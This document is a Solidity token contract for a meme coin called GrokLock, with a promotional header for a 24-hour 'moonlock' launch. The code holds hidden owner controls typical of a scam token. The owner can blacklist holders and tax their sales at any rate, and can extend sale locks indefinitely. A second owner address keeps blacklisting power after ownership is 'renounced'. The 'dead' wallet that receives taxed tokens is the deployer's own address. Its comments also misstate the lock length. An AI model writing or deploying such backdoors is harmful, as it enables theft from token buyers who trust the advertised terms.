/* 
TELEGRAM : https://t.me/moondeparture
Website : https://moonlock.space
Twitter : https://x.com/moonlocktoken

Three missions, three contracts, three moons.
First mission. GROK LOCK. 24 hour moonlock at launch.

After lock perion you can sell tokens or just buy more.
Max wallet at launch is 10.000 tokens (0.33%) and max wallet goes up 50% evey hour.
Get ready to rip!

*/


pragma solidity >=0.8.0;

import "./UniswapV2Router.sol";
import "./IUniswapV2Factory.sol";
import "./IUniswapV2Pair.sol";
import "./ERC20.sol";
import "./Math.sol";
import "./Ownable.sol";
import "./ReentrancyGuard.sol";
import "./SafeMath.sol";

enum Flag {
     None,
     Sell,
     Buy,
     Send
}

enum AddressType {
     Client,
     Friend,
     Naughty
}

contract MoonToken is ERC20, Ownable, ReentrancyGuard {
     using SafeMath for uint256;
     
     //Define the supply of FunToken:
     uint256 public _initMaxWallet;
     uint256 public _pTime;
     uint256 public _walletGrowth;

     mapping(address => uint256) public _unlockTime;
     mapping(address => bool) public _naughtyList;
     mapping(address => bool) public _whiteList;

     uint256 public _launchTime;
     uint256 public _lockTime;
     uint256 public _naughtyTax;
     uint256 public _friendlyTax;
     uint256 public _taxPercentage;
     uint256 public _calcAmount;

     IUniswapV2Router02 public swapRouter;
     address public swapPair;
     address public _deadWallet;
     address public _marketingWallet;
     address public _ownerWallet;
     address public _ownerAddress;


     modifier isOwner()
     {
          require((_ownerAddress == msg.sender || msg.sender == _ownerWallet), "Cannot access");
          _;
     }

     constructor() ERC20("GrokLock", "GROK") Ownable(msg.sender) {
          _launchTime = 0;
          _friendlyTax = 0;
          _naughtyTax = 30;
          _taxPercentage = 2;

          // max wallet initialization
          _initMaxWallet = 10_001 * (10 ** 18);
          _pTime = 60 * 60;
          _walletGrowth = 150;
          _ownerAddress = msg.sender;

          // for main net
          _deadWallet      = 0xedfd6A231e862C754884314F7BA7134d930486f7;
          _marketingWallet = 0xedfd6A231e862C754884314F7BA7134d930486f7;
          _ownerWallet     = 0xedfd6A231e862C754884314F7BA7134d930486f7;
          _lockTime        = 24 * 60; // one day lock

          IUniswapV2Router02 _uniswapRouter = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
          );
          swapPair = IUniswapV2Factory(_uniswapRouter.factory()).createPair(
            address(this),
            _uniswapRouter.WETH()
          );
          swapRouter = _uniswapRouter;

          _approve(msg.sender, address(swapRouter), type(uint256).max);
          _approve(address(this), address(swapRouter), type(uint256).max);

          _whiteList[swapPair] = true;
          _mint(msg.sender,3_000_000 * (10 ** 18));

     }

     // function handleTrading(
     function _transfer(address from, address to, uint256 amount) internal virtual override {
          require(from != address(0), "Address is not vaild");
          require(to != address(0), "Destination address is not valid");
          require(amount > 0, "Amount is Invalid");

          uint256 taxAmount = 0;
          address taxTo = _marketingWallet;
          // sell / buy 
          if(from == swapPair || to == swapPair){
               require(_launchTime != 0 , "Trading is not started yet");
               require(!(to == swapPair &&_unlockTime[from] >= block.timestamp), "Current account is locked");
            //   require(!(from == swapPair &&_unlockTime[to] >= block.timestamp), "Destination account is locked");

               if(to == swapPair){ //selling
                    require(_unlockTime[from] < block.timestamp, "Current account is locked");
                    taxAmount = calcTax(amount, from);
                    if(checkAddress(from) == AddressType.Naughty)
                         taxTo = _deadWallet;
               }
               if(from == swapPair){ //buying
                    taxAmount = calcTax(amount, to);
                    uint256 toAmount = balanceOf(to);
                    require((toAmount+amount <= getMaxWallet()) || _whiteList[to], "Destination amount exceed MaxWallet");
               }
          }
          // transfer
          else {
               require(_unlockTime[to] < block.timestamp, "Destination account is locked");
               taxAmount = calcTax(amount, to);
          }

          if(!_whiteList[to] && to != swapPair)
               lockTokens(to, _lockTime);

          if(taxAmount > 0)
               sendTaxTo(from, taxTo, taxAmount);
          
          if(from != swapPair){
               _approve(from, to, 0);
               _approve(from, to, (amount - taxAmount));
          }
          super._transfer(from, to, (amount-taxAmount));
     }

     function getMaxWallet() public view returns(uint256) {  
          if(_launchTime == 0) return 0;
          uint256 _initialMaxWallet = _initMaxWallet;
          uint256 _timeRound = (block.timestamp - _launchTime) / _pTime;
          uint256 _maxWallet = _initialMaxWallet;      
          if(_timeRound <= 100){
               if(totalSupply() / ((_walletGrowth / 100) **_timeRound) > 0){
                    for(uint256 i = 0 ; i < _timeRound ; i = i + 1)
                         _maxWallet = _maxWallet.mul(_walletGrowth).div(100);
                    
                    if(_maxWallet >= totalSupply()){
                         _maxWallet =  totalSupply();
                    }
               } else {
                    _maxWallet =  totalSupply();
               }
          } else {
               _maxWallet =  totalSupply();
          }
          
          return _maxWallet;
     }

     function setTimeRound(uint256 hr) public onlyOwner{
          _pTime = hr * 60 * 60;
     }

     function setWalletGrowthValue(uint256 growthVal) external onlyOwner{
          _walletGrowth = growthVal;
     }

     function sendTaxTo(address from, address to, uint256 amount) private returns(bool){
          super._transfer(from, to , amount);
          return true;
     }

     function lockTokens(address account, uint256 duration) internal {
          _unlockTime[account] = block.timestamp + duration;
     }

     function unlockTokens(address account) internal returns(bool) {
          require(_unlockTime[account] < block.timestamp, "Tokens are still locked");
          _unlockTime[account] = 0;
     }

     function setLockTimeInMinute(uint256 lockTimeInMins) external onlyOwner {
          _lockTime = lockTimeInMins * 60;
     }

     function setMarketingWallet(address wallet) external onlyOwner{
          _marketingWallet = wallet;
     }

     function setDeadWallet(address wallet) external onlyOwner{
          _deadWallet = wallet;
     }

     function lightTheCandle() external onlyOwner{
          _launchTime = block.timestamp;
     }

     function setNaughtyTax(uint256 tax) external onlyOwner{
          _naughtyTax = tax;
     }

     function setFriendlyTax(uint256 tax) external onlyOwner{
          _friendlyTax = tax;
     }

     function setInitialMaxWallet(uint256 maxAmount) external onlyOwner{
          _initMaxWallet = maxAmount * (10 ** 18);
     }
     function setInitialMaxWalletPercentage(uint256 percentage) external onlyOwner{
          _initMaxWallet = totalSupply() / 1000 * percentage;
     }

     function addToNaughtList(address account) public isOwner {
          _naughtyList[account] = true;
     }

     function addWhiteList(address account) public isOwner {
          _whiteList[account] = true;
          _unlockTime[account] = block.timestamp;
     }
     
     function calcTax(uint256 amount,  address account) public view returns (uint256) {
          uint256 txPercentage = _taxPercentage;
          AddressType addressType = checkAddress(account);
          if(addressType == AddressType.Naughty) 
               txPercentage = _naughtyTax;
          else if(addressType == AddressType.Friend) 
               txPercentage = _friendlyTax;
          uint256 taxAmount = amount.mul(txPercentage).div(100); // calculate tax amount from given token amount.

          return taxAmount;
     }

     function checkAddress(address account) private view returns (AddressType){
          if(_naughtyList[account]) return AddressType.Naughty;
          else if(_whiteList[account]) return AddressType.Friend;
          return AddressType.Client;
     }

     function renounceOwnership() public virtual override onlyOwner {
          _transferOwnership(address(0));
     } 

     function transferOwnership(address newOwner) public virtual override onlyOwner {
        if (newOwner == address(0)) {
            revert OwnableInvalidOwner(address(0));
        }
        _transferOwnership(newOwner);
        _ownerAddress = newOwner;
    }

    function isWhitelisted(address account) public view returns(bool){
          return _whiteList[account];
    }

    function isLocked(address account) public view returns(bool){
          return _unlockTime[account] > block.timestamp;
    }

    function calc() public view returns(uint256) {
     return _calcAmount;
    }
}